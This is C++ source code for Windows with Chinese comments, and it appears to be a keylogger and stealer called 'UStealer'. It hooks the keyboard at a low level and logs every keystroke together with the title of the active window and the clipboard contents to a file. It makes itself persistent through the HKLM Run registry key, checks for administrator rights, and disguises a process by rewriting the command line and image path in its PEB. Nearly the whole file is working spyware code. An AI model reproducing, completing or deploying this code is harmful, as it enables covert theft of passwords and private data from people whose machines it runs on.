// Project2.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include "key.h"
#include <sstream>
#include <xstring>
#include <comdef.h>
#include <atlstr.h>
#include <fstream>
#include <winternl.h>
 


//setlocale(LC_ALL, "chs");
#include "Project2.h"

using typedef_NtQueryInformationProcess = NTSTATUS(*)(
    HANDLE           ProcessHandle,				// 要获取信息的进程的句柄。
    PROCESSINFOCLASS ProcessInformationClass,		// 要获取的进程信息的类型
    PVOID            ProcessInformation,			// 指向由调用应用程序提供的缓冲区的指针
    ULONG            ProcessInformationLength,	// 指向的缓冲区的大小
    PULONG           ReturnLength					// 返回所请求信息的大小
    );
HHOOK hook;
//  全局键盘Hook句柄
HHOOK kKeyboardHook;
//  Shift Key 
BOOL bShift = FALSE;
//  存放键盘消息
std::string fileName = "C:\\test.txt";
//  Windows Title Text -260 char-
char cWindow[1000];
//  NULL is ok
HWND lastWindow = NULL;

char* ws2s(const std::wstring& ws)
{
    _bstr_t t = ws.c_str();
    char* pchar = (char*)t;
    std::string result = pchar;
    char* charTmp = new char;
    strcpy(charTmp, result.c_str());
    pchar = NULL;
    delete pchar;
    return charTmp;
}

char* ws2s(const std::string& ws)
{
    
    
    char* charTmp = new char;
    strcpy(charTmp, ws.c_str());
    
    return charTmp;
}

LRESULT CALLBACK lpfn1(int code, WPARAM wParam, LPARAM lParam)
{

   


    if (code < 0 || code == HC_NOREMOVE) {
        // 如果代码小于零，则挂钩过程必须将消息传递给CallNextHookEx函数，而无需进一步处理，并且应返回CallNextHookEx返回的值。此参数可以是下列值之一。(来自官网手册)
        return CallNextHookEx(hook, code, wParam, lParam);
    }
    if (lParam & 0x40000000) {
        // 【第30位的含义】键状态。如果在发送消息之前按下了键，则值为1。如果键被释放，则为0。(来自官网手册)
        // 我们只考虑被按下后松开的状态
        return CallNextHookEx(hook, code, wParam, lParam);
    }
    
    //MessageBox(NULL, cstr, cstr, NULL);
    HWND hwnd = GetActiveWindow();
    if (hwnd == NULL) {
        // 获取活动窗口失败
        hwnd = GetForegroundWindow();
    }
    if (hwnd == NULL) return CallNextHookEx(hook, code, wParam, lParam);
    
    char  windowText[56] = {};
    char szKeyName[200];
    GetKeyNameText(lParam, (LPWSTR)szKeyName, 100);

    GetWindowTextA(hwnd, windowText, 56);
    std::cout << HookCode(code, wParam, lParam) << std::endl;
    //static_cast<char>(strlen(windowText)+30);ssss
    FILE* fp = fopen("D:\\test.txt", "a");
    if(fp == NULL) return CallNextHookEx(hook, code, wParam, lParam);
    
    std::string windstr = windowText;
    std::string windstr1 = szKeyName;
    windstr += ": " + HookCode(code, wParam, lParam) + '\n';
    fwrite(windstr.c_str(), 1, windstr.size(), fp);
    fclose(fp);
    
    
    //MessageBoxA(NULL, windowText, "sssss1", NULL);
    return CallNextHookEx(hook, code, wParam, lParam);
}

LRESULT CALLBACK lpfn(int nCode, WPARAM wParam, LPARAM lParam)
{
    std::ofstream myfile(fileName, std::ios::out | std::ios::app);
    BOOL  caps = FALSE;  //  默认大写关闭
    SHORT capsShort = GetKeyState(VK_CAPITAL);
    std::string outPut;
    std::stringstream ssTemp;  //  string 字符流
    if (capsShort > 0)
    {
        //  如果大于0，则大写键按下，说明开启大写；反之小写
        caps = TRUE;
    }
    /*
    WH_KEYBOARD_LL uses the LowLevelKeyboardProc Call Back
    LINK = https://msdn.microsoft.com/en-us/library/windows/desktop/ms644985(v=vs.85).aspx
    */
    
    //  LowLevelKeyboardProc Structure 
    KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
    //  wParam和lParam参数包含关于键盘消息的信息。
    //MessageBox(NULL, L"fdsf", L"fdsf", NULL);
    if (true || nCode == HC_ACTION)
    {
        // Messsage data is ready for pickup
        // Check for SHIFT key
        if (p->vkCode == VK_LSHIFT || p->vkCode == VK_RSHIFT)
        {
            //  WM_KEYDOWN, WM_KEYUP, WM_SYSKEYDOWN, or WM_SYSKEYUP.
            if (wParam == WM_KEYDOWN)
            {
                bShift = TRUE;
            }
            if (wParam == WM_KEYUP)
            {
                bShift = FALSE;
            }
            else
            {
                bShift = FALSE;
            }
        }
        
        //  Start Loging keys now we are setup
        if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN)
        {
            //  Retrieves a handle to the foreground window (the window with which the user is currently working).
            HWND currentWindow = GetForegroundWindow();  //  返回前台窗口，获得当前窗口
            
            //  Check if we need to write new window output
            if (currentWindow != lastWindow)
            {
                SYSTEMTIME t{};
                GetLocalTime(&t);  //  获得当前系统时间
                int day = t.wDay;
                int month = t.wMonth;
                int year = t.wYear;
                int hour = t.wHour;
                int min = t.wMinute;
                int sec = t.wSecond;
                int dayName = t.wDayOfWeek;
                //  Build our output header
                ssTemp << "\n\n[+] " << Dayofweek(dayName) << " - " << day << "/" << month << "/" << year << "  ";
                ssTemp << hour << ":" << min << ":" << sec;
                outPut.append(ssTemp.str());
                ssTemp.clear();
                //  GetWindowTextACCC
                int c = GetWindowTextA(GetForegroundWindow(), cWindow, sizeof(cWindow));
                std::cout << c;
                ssTemp << " - Current Window: " << cWindow << "\n\n";
                //outPut.append(temp.str());
                std::cout << ssTemp.str() << std::endl;
                
                myfile << ssTemp.str();

                // Setup for next CallBackCC
                lastWindow = currentWindow;
            }
            //  Now capture keys
            if (p->vkCode)
            {
                ssTemp.clear();
                ssTemp << HookCode(p->vkCode, caps, bShift);
                std::cout << ssTemp.str();
                myfile << ssTemp.str();

            }
            //  Final output logic
        }
    }
    //  hook procedure must pass the message *Always*
    myfile.close();
    return CallNextHookEx(NULL, nCode, wParam, lParam);  //  hook链
}





void ttt() {

    std::cout << "Hello World!\n";
    //MessageBox(NULL, L"fdsfd",L"dddd", NULL);
    //HOOKPROC lpfn;

    hook = SetWindowsHookEx(WH_KEYBOARD, lpfn, GetModuleHandle(L"Project2"), NULL);
    if (hook == NULL) {
        MessageBox(NULL, L"fdsfd", L"失败了", NULL);
    }
    else {
        // MessageBox(NULL, L"fdsfd111", L"成功了", NULL);
    }
    // while (1) {};
}



DWORD   g_main_tid = 0;

HHOOK   g_kb_hook = 0;
//#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
BOOL CALLBACK con_handler(DWORD)

{

    PostThreadMessage(g_main_tid, WM_QUIT, 0, 0);

    return TRUE;

};

// 复制数据至剪切板
BOOL CopyToClipboard(const char* pszData, const int nDataLen)
{
    if (::OpenClipboard(NULL))
    {
        ::EmptyClipboard();
        HGLOBAL clipbuffer;
        char* buffer;
        clipbuffer = ::GlobalAlloc(GMEM_DDESHARE, nDataLen + 1);
        buffer = (char*)::GlobalLock(clipbuffer);
        strcpy(buffer, pszData);
        ::GlobalUnlock(clipbuffer);
        ::SetClipboardData(CF_TEXT, clipbuffer);
        ::CloseClipboard();
        return TRUE;
    }
    return FALSE;
}

// 从剪切板中取得文本数据
BOOL GetTextFromClipboard(std::string& outstr)
{
    if (::OpenClipboard(NULL))
    {
        //获得剪贴板数据
        HGLOBAL hMem = GetClipboardData(CF_TEXT);
        if (NULL != hMem)
        {
            char* lpStr = (char*)::GlobalLock(hMem);
            if (NULL != lpStr)
            {
                outstr = lpStr;
                //MessageBox(0, aa, L"", 0);
                ::GlobalUnlock(hMem);
            }
        }

        ::CloseClipboard();// 关闭剪切板
        return TRUE;
    }
    return FALSE;
}

// 从剪切板中取得文件列表路径数据
std::vector<std::string> GetFilePathsFromClipboard()
{
    std::vector<std::string> path_list;
    if (::OpenClipboard(NULL))
    {
        //获得剪贴板数据

        HDROP hDrop = HDROP(::GetClipboardData(CF_HDROP)); // 获取剪切板中复制的文件列表相关句柄

        if (hDrop != NULL)
        {
            WCHAR szFilePathName[MAX_PATH + 1] = { 0 };

            UINT nNumOfFiles = DragQueryFile(hDrop, 0xFFFFFFFF, NULL, 0); // 得到文件个数

            // 考虑到用户可能同时选中了多个对象(可能既包含文件也包含文件夹)，所以要循环处理
            for (UINT nIndex = 0; nIndex < nNumOfFiles; ++nIndex)
            {
                memset(szFilePathName, 0, MAX_PATH + 1);
                DragQueryFile(hDrop, nIndex, szFilePathName, MAX_PATH);  // 得到文件名

                _bstr_t path(szFilePathName);
                std::string ss = (LPCSTR)path;

                path_list.push_back(ss);
            }
        }
    }
    ::CloseClipboard();// 关闭剪切板
    return path_list;
}

// 返回盘符
std::vector<std::string> getDiskInfo()
{
    std::vector<std::string> path_list;
    char rootPath[10] = { 0 };
    int isExist = 0;
    int diskNum = 0;
    int countTotal = 0;
    int type = 0;

    //printf("磁盘为：");
    for (char a = 'A'; a <= 'Z'; a++) //获取所有盘符 
    {
        sprintf_s(rootPath, "%c:\\", a);
        //isExist值的类别 0:exist 用来检查目录是否存在,2:write 写权限,4:read 读权限,3:write-read 读写权限
        isExist = _access(rootPath, 0);

        if (isExist == 0)
        {
            countTotal++;
            //printf("%s\t", rootPath);
            wchar_t diskName[10] = { rootPath[0], L': ' };
            //type的类别 1:可移动磁盘，2:软盘，3:本地硬盘，4:网络磁盘，5:CD-ROM，6:RAM磁盘
            type = GetDriveTypeW(diskName);
            if(type == 3)
                path_list.push_back(rootPath);
        }
    }

    //printf("\n硬盘个数为：");
    for (wchar_t a = 'A'; a <= 'Z'; a++) //获取本地硬盘盘符数
    {
        wchar_t diskName[10] = { a, L': ' };
        //type的类别 1:可移动磁盘，2:软盘，3:本地硬盘，4:网络磁盘，5:CD-ROM，6:RAM磁盘
        type = GetDriveTypeW(diskName);
        if (type == 3) {
            diskNum++;
        }
    }
    //printf("%d\n", diskNum);
    return path_list;
}

LRESULT CALLBACK kb_proc(int code, WPARAM w, LPARAM lParam)

{
    static bool isShiftdown = false;
     PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
    HWND hwnd = GetActiveWindow();
    char  windowText[56] = {};
    char szKeyName[200];  GetKeyNameText(lParam, (LPWSTR)szKeyName, 100);

   if (hwnd == NULL) {
       // 获取活动窗口失败
       hwnd = GetForegroundWindow();
   }
   GetWindowTextA(hwnd, windowText, 56);


   const char* info = nullptr;
   SHORT CapiTAL_status = GetKeyState(VK_CAPITAL);


   if (w == WM_KEYDOWN)
   {
       if (p->vkCode == VK_LSHIFT || p->vkCode == VK_RSHIFT)
           isShiftdown = true;
       info = "key dn";
       std::cout << windowText << "按键" << HookCode(p->vkCode, CapiTAL_status, isShiftdown) << "   " << std::endl;
   }


   else if (w == WM_KEYUP)
   {
       info = "key up";
       if (p->vkCode == VK_LSHIFT || p->vkCode == VK_RSHIFT)
           isShiftdown = false;
   }

   else if (w == WM_SYSKEYDOWN)
   {
       info = "sys key dn";
       std::cout << windowText << "按键" << HookCode(p->vkCode, CapiTAL_status, isShiftdown) << "   " << std::endl;

   }
      
   else if (w == WM_SYSKEYUP)

       info = "sys key up";

   /* printf("%s - %s vkCode [%04x], scanCode [%04x]\n",

        info, HookCode(p->vkCode, !s, isShiftdown).c_str(), p->vkCode, p->scanCode);*/

        // always call next hook
   std::string strss(windowText);
   strss += "按键" ;
   strss += info;
   std::string Clipcontent;
   GetTextFromClipboard(Clipcontent);


   strss +=  " " + HookCode(p->vkCode, CapiTAL_status, isShiftdown) + " " + "剪切板文本内容：" +   Clipcontent + '\n' ;
   FILE* fp = fopen(fileName.c_str(), "a");
   if (fp) {
       fwrite(strss.c_str(), 1, strss.size(), fp);
       fclose(fp);
   }

    return CallNextHookEx(g_kb_hook, code, w, lParam);

};
// 设置入口地址
//#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" ) // 设置入口地址

void Start() {
    g_main_tid = GetCurrentThreadId();
    SetConsoleCtrlHandler(&con_handler, TRUE);

    g_kb_hook = SetWindowsHookEx(

        WH_KEYBOARD_LL,

        &kb_proc,

        GetModuleHandle(NULL), //　不能为NULL，否则失败

        0);

    if (g_kb_hook == NULL)

    {

        fprintf(stderr,

            "SetWindowsHookEx failed with error %d\n",

            ::GetLastError());

        return;

    };

    // 消息循环是必须的，想知道原因可以查msdn

    MSG msg;

    while (GetMessage(&msg, NULL, 0, 0))

    {

        TranslateMessage(&msg);

        DispatchMessage(&msg);

    };

    UnhookWindowsHookEx(g_kb_hook);
}

using IsRunAsAdmin = bool(*)();

// 注册表添加开机启动 这个自启动不是以管理员运行
void pr::HKRunator(LPCTSTR programName)   //程序名称（**全路径**）
{
    HKEY hkey = NULL;
    DWORD rc;

    rc = RegCreateKeyEx(HKEY_LOCAL_MACHINE,                      //创建一个注册表项，如果有则打开该注册表项
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_WOW64_64KEY | KEY_ALL_ACCESS,    //部分windows系统编译该行会报错， 删掉 “”KEY_WOW64_64KEY | “” 即可
        NULL,
        &hkey,
        NULL);
    
    if (rc == ERROR_SUCCESS)
    {
        int proglength = (lstrlen(programName) + 1) * sizeof(TCHAR);
        const BYTE* cc = (const BYTE*)programName;
        
        BYTE dwValue[254];
        DWORD dwBytes = 254;
        DWORD type = REG_SZ;
        SetConsoleOutputCP(CP_UTF8);
        if (::RegQueryValueEx(hkey, _T("UStealer"), 0, &type, (LPBYTE)&dwValue, &dwBytes) == ERROR_SUCCESS) {
            // 存在
            _tprintf(_T("ProgramFilesDir = %s\n"), dwValue);
            //for (int i = 0; i < sizeof(dwValue);i++) {
            //    std::cout << dwValue[i];
            //   // if (dwValue[i] == 0) break;
            //    
            //}
            std::cout << std::endl;
        }
        else {
            // 不存在
            rc = RegSetValueEx(hkey, L"UStealer", 0, REG_SZ, cc, proglength);
        }
        
        if (rc == ERROR_SUCCESS)
        {
            RegCloseKey(hkey);
        }
    }
}
// 是否有管理员权限
BOOL pr::IsRunAsAdministrator()
{
    BOOL fIsRunAsAdmin = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PSID pAdministratorsGroup = NULL;

    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (!AllocateAndInitializeSid(
        &NtAuthority,
        2,
        SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0,
        &pAdministratorsGroup))
    {
        dwError = GetLastError();
        goto Cleanup;
    }

    if (!CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin))
    {
        dwError = GetLastError();
        goto Cleanup;
    }

Cleanup:

    if (pAdministratorsGroup)
    {
        FreeSid(pAdministratorsGroup);
        pAdministratorsGroup = NULL;
    }

    if (ERROR_SUCCESS != dwError)
    {
        throw dwError;
    }

    return fIsRunAsAdmin;
}


// 修改指定进程的进程环境块PEB中的路径和命令行信息, 实现进程伪装
BOOL pr::DisguiseProcess(DWORD dwProcessId, wchar_t* lpwszPath , wchar_t* lpwszCmd)
{
    // 打开进程获取句柄
    
   
    HANDLE hProcess = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
    if (NULL == hProcess)
    {
        //ShowError("OpenProcess");
        return FALSE;
    }
    typedef_NtQueryInformationProcess NtQueryInformationProcess = NULL;
    PROCESS_BASIC_INFORMATION pbi = { 0 };
    PEB peb = { 0 };
    RTL_USER_PROCESS_PARAMETERS Param = { 0 };
    USHORT usCmdLen = 0;
    USHORT usPathLen = 0;
    // 需要通过 LoadLibrary、GetProcessAddress 从 ntdll.dll 中获取地址
    NtQueryInformationProcess = (typedef_NtQueryInformationProcess)::GetProcAddress(
        ::LoadLibrary(L"ntdll.dll"), "NtQueryInformationProcess");
    if (NULL == NtQueryInformationProcess)
    {
        //ShowError("GetProcAddress");
        return FALSE;
    }
    // 获取指定进程的基本信息
    NTSTATUS status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
    if (!NT_SUCCESS(status))
    {
        //ShowError("NtQueryInformationProcess");
        return FALSE;
    }
    /*
          注意在读写其他进程的时候，注意要使用ReadProcessMemory/WriteProcessMemory进行操作，
        每个指针指向的内容都需要获取，因为指针只能指向本进程的地址空间，必须要读取到本进程空间。
        要不然一直提示位置访问错误!
    */
    // 获取指定进程进本信息结构中的PebBaseAddress
    ::ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), NULL);
    // 获取指定进程环境块结构中的ProcessParameters, 注意指针指向的是指定进程空间中
    ::ReadProcessMemory(hProcess, peb.ProcessParameters, &Param, sizeof(Param), NULL);
    // 修改指定进程环境块PEB中命令行信息, 注意指针指向的是指定进程空间中
    usCmdLen = 2 + 2 * ::wcslen(lpwszCmd);
    ::WriteProcessMemory(hProcess, Param.CommandLine.Buffer, lpwszCmd, usCmdLen, NULL);
    ::WriteProcessMemory(hProcess, &Param.CommandLine.Length, &usCmdLen, sizeof(usCmdLen), NULL);
    // 修改指定进程环境块PEB中路径信息, 注意指针指向的是指定进程空间中
    usPathLen = 2 + 2 * ::wcslen(lpwszPath);
    ::WriteProcessMemory(hProcess, Param.ImagePathName.Buffer, lpwszPath, usPathLen, NULL);
    ::WriteProcessMemory(hProcess, &Param.ImagePathName.Length, &usPathLen, sizeof(usPathLen), NULL);
    return TRUE;
}



void pr::installhook(LPCTSTR exxpath)
{




    //GetCurrentProcessId();
    

    for (std::string temp : getDiskInfo()) {
        if (temp != "C:\\" && temp.size()) {
            fileName = temp + fileName.substr(3);

            break;
        }
    }
    if (fileName[0] == 'C') {
        // 获取管理权限
        if (!IsRunAsAdministrator()) {
            return;
        }
        else
        {
            // 清除注册表自动 
        }

    }
    else
    {
        // 用加注册表自启动 

        HKRunator(exxpath);
    }
    Start();

}

// 运行程序: Ctrl + F5 或调试 >“开始执行(不调试)”菜单
// 调试程序: F5 或调试 >“开始调试”菜单

// 入门使用技巧: 
//   1. 使用解决方案资源管理器窗口添加/管理文件
//   2. 使用团队资源管理器窗口连接到源代码管理
//   3. 使用输出窗口查看生成输出和其他消息
//   4. 使用错误列表窗口查看错误
//   5. 转到“项目”>“添加新项”以创建新的代码文件，或转到“项目”>“添加现有项”以将现有代码文件添加到项目
//   6. 将来，若要再次打开此项目，请转到“文件”>“打开”>“项目”并选择 .sln 文件
